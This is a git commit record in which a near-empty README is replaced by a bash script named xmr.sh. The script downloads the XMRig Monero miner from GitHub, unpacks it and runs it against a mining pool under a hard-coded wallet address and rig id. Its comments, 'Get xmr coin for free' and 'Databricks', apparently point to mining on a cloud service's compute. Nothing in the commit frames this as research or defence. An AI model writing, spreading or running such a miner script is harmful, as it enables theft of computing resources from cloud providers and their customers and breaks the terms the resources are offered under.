0fd35752903c9ce174ddd9f25960abab5c2a5ff9
ADYZM <46257040+ADYZM@users.noreply.github.com>
2022-04-14 02:33:10 +0700

    Update and rename README.md to xmr.sh

--- README.md
+++
@@ -1,2 +0,0 @@
-# file.sh
-file
---
+++ xmr.sh
@@ -0,0 +1,12 @@
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
+tar xvzf xmrig-6.16.4-focal-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig -o sg.minexmr.com:443 -u 89AZB4nEHnyRitiFn5cj7BiBR9b8jXhrrChzrfdmi1kpdt8kr6JiPx82jyseExV4gQTvrEu8DhXzCdpPrD7q2hA5AcmQDrK -k --tls --rig-id kerjo1
